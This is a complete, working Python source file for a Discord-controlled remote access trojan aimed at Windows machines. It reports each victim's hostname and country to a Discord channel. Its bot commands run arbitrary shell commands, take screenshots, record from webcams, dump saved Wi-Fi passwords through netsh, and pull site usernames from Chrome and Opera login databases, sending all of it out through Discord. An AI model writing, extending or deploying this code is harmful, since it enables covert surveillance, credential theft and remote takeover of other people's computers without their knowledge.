# pip install discord.py pyautogui requests opencv-python pygrabber numpy pillow comtypes

import discord, socket, subprocess, pyautogui, os, uuid, requests, io, threading, sqlite3, shutil, cv2, datetime
from pygrabber.dshow_graph import FilterGraph
from tkinter import messagebox
from urllib.parse import urlparse

is_recording = {} 
recording_threads = {}

session = uuid.uuid4()
TOKEN = "" # <--- Discord Bot Token 

current_dir = os.getcwd()
intents = discord.Intents.default()
intents.message_content = True

try:
    response = requests.get('https://ipinfo.io/json')
    jsondataipinfo = response.json()
    country = jsondataipinfo.get('country', 'Unknown')
except:
    country = "Unknown"

client = discord.Client(intents=intents)
channel_ref = None

def get_hostname():
    return socket.gethostname().lower().replace(" ", "-")
    
async def send_msg(channel, text):
    if len(text) > 1900:
        with io.BytesIO(text.encode('utf-8')) as out_file:
            await channel.send("⚠️ Log too long", file=discord.File(out_file, filename="output.txt"))
    else:
        await channel.send(f"```\n{text}\n```")

def show_popup(msg):
    # 
    messagebox.showinfo("Announce Admin Remote Control", msg)

def record_camera_thread(cam_index, filename, channel_id):
    cap = cv2.VideoCapture(cam_index)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))

    while is_recording.get(channel_id, False):
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    
    cap.release()
    out.release()

@client.event
async def on_ready():
    global channel_ref
    try:
        guild = client.guilds[0]
        name = get_hostname()
        channel_ref = await guild.create_text_channel(name)
        
        header = (
            f"✅ Connected: `{name}`\n"
            f"📍 Path: `{current_dir}`\n"
            f"📍 Country: `{country}`\n"
            f"Session: `{session}`\n"
            f"--- Commands ---\n"
            f"`!cmd <command>` | `!screen` | `!stealwifipasswords` | `!stealusernames`\n"
            f"`!showcameras` | `!recordcamera <num>` | `!stoprecordcamera` | `!chatsendmsg <text>`"
        )
        await channel_ref.send(header)
    except Exception as e:
        print(f"Error on_ready: {e}")

@client.event
async def on_message(message):
    global channel_ref, current_dir, is_recording, recording_threads

    if message.author == client.user: return
    if channel_ref is None or message.channel.id != channel_ref.id: return

    # 
    if message.content.startswith("!chatsendmsg "):
        msg_text = message.content[13:].strip()
        if msg_text:
            #
            threading.Thread(target=show_popup, args=(msg_text,), daemon=True).start()
            await message.channel.send(f"✅ Popup sent: `{msg_text}`")
        else:
            await message.channel.send("❌ Usage: `!chatsendmsg <text>`")

    # --- Camera Commands ---

    elif message.content == "!showcameras":
        try:
            graph = FilterGraph()
            devices = graph.get_input_devices()
            if not devices:
                await message.channel.send("No cameras found.")
            else:
                cam_list = "Available Cameras:\n"
                for index, name in enumerate(devices):
                    cam_list += f"[{index}] : {name}\n"
                await send_msg(message.channel, cam_list)
        except Exception as e:
            await message.channel.send(f"Error listing cameras: {e}")

    elif message.content.startswith("!recordcamera "):
        if is_recording.get(message.channel.id):
            await message.channel.send("Already recording!")
            return
            
        try:
            cam_idx = int(message.content.split(" ")[1])
            cap = cv2.VideoCapture(cam_idx, cv2.CAP_DSHOW)

            if not cap.isOpened():
                await message.channel.send(f"❌ Camera {cam_idx} does not exist.")
                return

            ret, frame = cap.read()
            cap.release()

            if not ret or frame is None:
                await message.channel.send(f"⚠️ Camera {cam_idx} exists but has no signal / is busy.")
                return

            date_str = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"Recorded-{date_str}.avi"

            is_recording[message.channel.id] = True
            thread = threading.Thread(
                target=record_camera_thread,
                args=(cam_idx, filename, message.channel.id)
            )
            thread.start()
            recording_threads[message.channel.id] = filename

            await message.channel.send(f"✅ Started recording camera {cam_idx}...")

        except ValueError:
            await message.channel.send("❌ Give a valid camera number (np. !recordcamera 0)")
        except Exception as e:
            await message.channel.send(f"Error starting record: {e}")

    elif message.content == "!stoprecordcamera":
        if not is_recording.get(message.channel.id):
            await message.channel.send("Recording has not been started.")
        else:
            is_recording[message.channel.id] = False
            filename = recording_threads.get(message.channel.id)
            await message.channel.send("Stopped. Processing video...")
            
            import time
            time.sleep(2)
            
            if filename and os.path.exists(filename):
                await message.channel.send(content="Recorded.", file=discord.File(filename))
                os.remove(filename)
            else:
                await message.channel.send("Error: File was not created.")
            
            recording_threads[message.channel.id] = None

    elif message.content == "!stealwifipasswords":
        try:
            meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace")
            profiles = [i.split(":")[1][1:-1] for i in meta_data.split('\n') if "All User Profile" in i]
            
            wifi_list = []
            for name in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors="backslashreplace")
                    password_line = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                    password = password_line[0] if password_line else "None"
                    wifi_list.append(f"SSID: {name} Password: {password}")
                except:
                    wifi_list.append(f"SSID: {name} Password: ERROR")
            
            final_output = "\n".join(wifi_list) if wifi_list else "No Wi-Fi profiles found."
            await send_msg(message.channel, final_output)
        except Exception as e:
            await message.channel.send(f"❌ WiFi Error: {e}")

    elif message.content == "!stealusernames":
        paths = {
            "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
            "Opera": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data"),
            "Opera GX": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data")
        }
        temp_dir = os.environ.get("TEMP")
        temp_db = os.path.join(temp_dir, "browser_tmp.db")
        output_file = os.path.join(temp_dir, "extracted_users.txt")
        all_data = set()

        for browser_name, db_path in paths.items():
            if os.path.exists(db_path):
                try:
                    shutil.copyfile(db_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value FROM logins")
                    for raw_url, user in cursor.fetchall():
                        if user:
                            domain = urlparse(raw_url).netloc.replace("www.", "")
                            if domain: all_data.add(f"[{browser_name}] {domain}: {user}")
                    conn.close()
                    os.remove(temp_db)
                except: continue

        if all_data:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("\n".join(sorted(all_data)))
            await message.channel.send(file=discord.File(output_file))
            os.remove(output_file)
        else:
            await message.channel.send("❌ No usernames found.")

    elif message.content == "!screen":
        path = os.path.join(os.environ.get('TEMP', os.getcwd()), "s.png")
        try:
            pyautogui.screenshot(path)
            await message.channel.send(file=discord.File(path))
            os.remove(path)
        except Exception as e:
            await message.channel.send(f"Screenshot Error: {e}")

    elif message.content.startswith("!cmd "):
        cmd = message.content[5:].strip()
        if cmd.startswith("cd "):
            new_path = os.path.abspath(os.path.join(current_dir, cmd[3:].strip()))
            if os.path.isdir(new_path):
                current_dir = new_path
                await message.channel.send(f"📍 Directory: `{current_dir}`")
            else:
                await message.channel.send("❌ Not found.")
            return
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding="cp852", errors="replace", cwd=current_dir)
            output = (result.stdout or result.stderr or "Executed.").strip()
            await send_msg(message.channel, output)
        except Exception as e:
            await message.channel.send(f"Error: {e}")

client.run(TOKEN)
